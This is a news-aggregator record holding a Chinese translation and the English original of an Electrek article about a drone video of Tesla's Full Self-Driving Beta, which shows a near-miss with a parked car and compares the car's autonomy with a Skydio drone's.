"今天，我们来看看一段有趣的新视频，视频中展示了特斯拉全自动驾驶Beta在一段新的无人机视频中的空中表演，还有一个可怕的险些错过。\n正如我们上周报道的那样，特斯拉已经开始推广其“全自动驾驶”功能的第一个版本，该功能可以在城市街道和高速公路上自动导航。\n然而，这一功能还处于测试阶段，并不是真正的“全自动驾驶”(FSD)，因为它要求司机总是准备好在需要的时候接管和纠正系统。\n目前只有少数车主可以使用“早期访问计划”中的测试版软件，但特斯拉允许他们分享他们的体验视频。\n其中一位在YouTube上被称为“Brandon M”的车主一直在分享特斯拉FSD功能早期版本的优缺点。\n我们在特斯拉早期的全自动驾驶测试版视频收藏中分享了他的一些视频。\n现在，他带着一段有趣的视频回来了，视频中他的Model3在测试全自动驾驶Beta时连续拍摄了一张无人机照片：\n正如你所看到的，视频一开始就有一个非常可怕的险些发生，Model3似乎想撞上一辆停着的车。\n由于停放的汽车角度，看起来几乎像是消防处想要跟踪这辆车，但它显然是停着的，没有布兰登的干预，看起来不像是要刹车。\n这是一个很好的提醒，这款“全自动驾驶测试版”并不是真正的自动驾驶，因为它确实需要司机监控系统，随时准备接手。\n在8分钟的测试中，FSD测试版还出现了一些其他问题，但在一些任务中也表现良好。\n正如我们的姊妹网站DroneDJ所指出的那样，在这段视频中，Skydio无人机的自动飞行能力几乎超过了特斯拉的FSD。\n显然，在3D世界中自由上下移动与在2D表面上按照交通规则移动完全不同，但看到无人机毫不费力地避开树木和电线还是令人印象深刻。\n有趣的是，我们之前报道过，几位早期的特斯拉自动驾驶工程师最终研发了Skydio的无人机。\n您正在阅读的是electrek，专家们日复一日地发布关于特斯拉、电动汽车和绿色能源的新闻。一定要查看我们的主页，了解所有最新新闻，并在Twitter、Facebook和LinkedIn上关注electrek，随时了解最新消息。不知道从何说起？请查看我们的YouTube频道以了解最新的评论。", "note_en": "Today, we take a look at an interesting new video showing Tesla Full Self-Driving Beta’s performance from the sky in a new drone video with a scary near-miss.\n  As we reported last week,  Tesla has started pushing the first version of its “Full Self-Driving” feature that autonomously navigates on both city streets and highways.\n However, the feature is in beta and it is not truly “Full Self-Driving” (FSD) since it requires the driver to always be ready to take over and correct the system when needed.\n Only a few owners currently have access to the beta software in the “early access program,” but Tesla allowed them to share videos of their experience.\n One of those owners who is going by “Brandon M” on YouTube has been sharing the good and the bad of the early version of Tesla’s FSD feature.\n We shared some of his videos in our early collection of Tesla Full Self-Driving Beta videos.\n Now he is back with an interesting video that features a continuous drone shot of his Model 3 while testing the Full Self-Driving Beta:\n  As you can see, the video starts off with a very scary near-miss where the Model 3 seemed to want to smash into a parked car.\n Due to the angle of the parked car, it almost looked like the FSD wanted to follow the car, but it was clearly parked and it didn’t look like it was about to brake without Brandon’s intervention.\n It’s a good reminder that this “Full Self-Driving Beta” is not truly self-driving, as it really requires a driver to monitor the system and be ready to take over at all times.\n The FSD beta had a few other hiccups during the eight-minute test, but it also performed well at some tasks.\n As noted by our sister site   DroneDJ, the self-flying capability of the Skydio drone pretty much outshines Tesla’s FSD in this video.\n Obviously, navigating a 3D world with the freedom of moving up and down is completely different than moving on a 2D surface with traffic rules, but it’s nonetheless impressive to see the drone effortlessly avoid trees and power lines.\n Interestingly, we previously reported that  several early Tesla Autopilot engineers ended up working on Skydio’s drone.\n  You’re reading Electrek— experts who break news about  Tesla,  electric vehicles, and  green energy, day after day. Be sure to check out our  homepage for all the latest news, and follow Electrek on  Twitter,  Facebook, and  LinkedIn to stay in the loop. Don’t know where to start? Check out our  YouTube channel for the latest reviews.", "posttime": "2020-11-01 05:42:56", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "特斯拉,性能,驾驶,full,视频", "title": "特斯拉全自动驾驶Beta从天而降性能惊险险些出击", "title_en": "Tesla Full Self-Driving Beta’s performance from the sky with scary near-miss", "transed": 1, "url": "https://electrek.co/2020/10/30/tesla-full-self-driving-beta-performance-scary-near-miss/", "via": "", "real_tags": ["特斯拉", "性能", "驾驶", "full", "视频"]}]